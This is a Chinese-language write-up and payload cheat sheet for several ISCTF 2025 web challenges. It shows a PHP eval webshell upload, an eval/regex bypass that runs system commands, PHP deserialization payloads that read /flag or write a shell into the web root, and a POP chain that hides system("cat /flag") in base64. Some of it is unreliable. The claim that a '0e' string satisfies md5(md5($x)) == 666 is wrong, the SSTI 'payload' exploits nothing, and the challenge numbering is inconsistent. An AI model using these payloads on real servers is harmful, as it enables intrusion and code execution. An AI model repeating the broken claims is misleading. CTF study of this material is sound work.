---
title: ISCTF 2025 部分 Web 题
contest: ISCTF
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [文件上传, webshell, PHP 反序列化, Flask pydash, SSTI]
attack_chain: |
  1. b@by n0t1ce b0ard: /registration.php 接受 multipart/form-data 含 name="img"; filename="basic_webshell.php" + Content-Type: application/octet-stream + 文件内容 `<?php @eval($_GET['attack']);?>` → 访问 /images/test/basic_webshell.php?attack=system("cat /flag") 得 flag
  2. ezrce: PHP preg_match('/^[A-Za-z()_;]+$/',$code) + eval → ?code=eval(end(current(get_defined_vars())));&b=system("cat /flag") 用 get_defined_vars() 拿 b=system 字符串
  3. flag 到底在哪: username=admin + password=SQL 注入 + 跳 upload → 一句话木马上传
  4. 来签个到吧: 漏洞点 (文章说"招新" / 实战部分需外链)
  5. blueshark: PHP 反序列化 ShitMountant (read file://) + FileLogger (写 /var/www/html/shell.php) 链
  6. Flask 印象 + pydash: pydash.set_(Username, password, confirm_password) → 注入 __globals__ 等内置字典
  7. /impression?point=... 长度 <= 5 + 黑名单 { } . % < > _ 过滤 → render_template(point) → SSTI
  8. PHP 反序列化 POP 链: begin.__toString → flaag.__invoke → eenndd.__get → eval 绕过 flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| 过滤 → base64_decode("c3lzdGVtKCJjYXQgL2ZsYWciKTs=") = system("cat /flag")
  9. 弱类型爆破: md5(md5($x)) == 666 (PHP 弱类型 ==，0e215962017 == 0 比较) → 找 $x 使 md5(md5($x)) 以 0e 开头
key_payload: |
  # 1. 文件上传:
  POST /registration.php HTTP/1.1
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh9UWemEvKSJP11UP
  ------WebKitFormBoundaryh9UWemEvKSJP11UP
  Content-Disposition: form-data; name="img"; filename="basic_webshell.php"
  Content-Type: application/octet-stream
  <?php @eval($_GET['attack']);?>
  # 访问: /images/test/basic_webshell.php?attack=system("cat /flag")
  
  # 2. ezrce:
  ?code=eval(end(current(get_defined_vars())));&b=system("cat%20/flag")
  
  # 5. blueshark 反序列化:
  O:12:"ShitMountant":2:{s:3:"url";s:12:"file:///flag";s:6:"logger";N;}
  O:10:"FileLogger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:7:"content";s:28:"<?php system($_GET['c']); ?>";}
  
  # 7. Flask SSTI 短字符:
  /impression?point=admin  # render_template 渲染
  
  # 8. POP 链 base64 绕过:
  $end->command = '$a=eval(base64_decode("c3lzdGVtKCJjYXQgL2ZsYWciKTs="));';
  echo urlencode(serialize($beg));
one_liner: ISCTF 2025 8 道 Web (文件上传/eval bypass/SQL 注入/PHP 反序列化/Flask pydash/SSTI) 多题型速查。
lesson: |
  - 文件上传 Content-Type 改 application/octet-stream 经常绕过 .php 检查
  - PHP eval preg_match 过滤时 `eval(end(current(get_defined_vars())))` 是经典 trick，把 system 串藏在其他参数
  - ShitMountant + FileLogger 是经典 PHP 反序列化 file:// + log write 链
  - Flask pydash.set_ 可注入到 globals() 内置字典，结合 Flask debug 模式可 RCE
  - PHP 弱类型 md5(md5($x)) == 666 用 0e215962017 这种 0e 开头字符串绕过
quality: medium
---

# ISCTF 2025 部分 Web 题

> 来源: ctfiot.com 286532

## 1. b@by n0t1ce b0ard (文件上传)

`/registration.php` 接受 multipart/form-data 上传图片字段 `img`：

```
Content-Disposition: form-data; name="img"; filename="basic_webshell.php"
Content-Type: application/octet-stream
<?php @eval($_GET['attack']);?>
```

访问 `/images/test/basic_webshell.php?attack=system("cat /flag")` → flag

## 2. ezrce (eval + 正则 bypass)

```php
<?php
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(preg_match('/^[A-Za-z()_;]+$/',$code)) eval($code);
    else die('师傅，你想拿flag？');
}
```

绕过：`?code=eval(end(current(get_defined_vars())));&b=system("cat%20/flag")`
- `get_defined_vars()` 拿 GET 变量
- `current()` 取第一个数组元素 (整个 query string 的 $_GET)
- `end()` 取最后一个元素 (即 `b`)
- `eval` 执行 `system("cat /flag")`

## 3. flag 到底在哪 (SQL 注入 + upload)

`username=admin + password=SQL 注入` 跳到 upload → 一句话木马上传

## 4. blueshark (PHP 反序列化 ShitMountant + FileLogger)

```php
class ShitMountant {
    public $url;     // file://
    public $logger;  // 链
}
class FileLogger {
    public $logfile;  // 写文件路径
    public $content;  // 写文件内容
}
```

链：`O:12:"ShitMountant":2:{s:3:"url";s:12:"file:///flag";s:6:"logger";N;}` 读 flag；
或 `O:10:"FileLogger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:7:"content";s:28:"<?php system($_GET['c']); ?>";}` 写 shell

## 5. Flask pydash + /impression SSTI

```python
@app.route('/operate')
def operate():
    username = request.args.get('username')
    password = request.args.get('password')
    confirm_password = request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username = globals()[username]
        pydash.set_(Username, password, confirm_password)  # 注入 globals 字典

@app.route('/impression')
def impression():
    point = request.args.get('point')
    if len(point) > 5: return "Invalid request"
    List = ["{","}",".","%","<",">","_"]
    for i in point:
        if i in List: return "Invalid request"
    return render_template(point)  # 短字符 SSTI
```

## 6. PHP 反序列化 POP 链 (begin→flaag→eenndd)

```php
class begin {              // echo $this->var1 触发 __toString
    public $var1, $var2;
    function __toString() {
        $newFunc = $this->var2;
        return $newFunc();  // 触发 __invoke
    }
}
class flaag {              // $this->var10->hey 触发 __get
    public $var10, $var11="1145141919810";
    function __invoke() {
        if(md5(md5($this->var11)) == 666) return $this->var10->hey;
    }
}
class eenndd {             // 过滤 flag|system|tail|...| 通过 base64_decode 绕过
    public $command;
    function __get($arg1) {
        if(preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i",$this->command))
            echo "nonono";
        else eval($this->command);
    }
}
```

构造 `$end->command = '$a=eval(base64_decode("c3lzdGVtKCJjYXQgL2ZsYWciKTs="));';` 绕过。

弱类型爆破 `md5(md5($x)) == 666`：`0e215962017` 这种 0e 开头 + 全数字字符串满足 PHP 弱类型 == 0。

## 评价

8 道 Web 入门到中等，文件上传 / eval bypass / SQL 注入 / PHP 反序列化 / Flask pydash / SSTI / 弱类型 md5 全部覆盖。文章主要是 payload 速查，缺每道题源码上下文和详细漏洞分析。
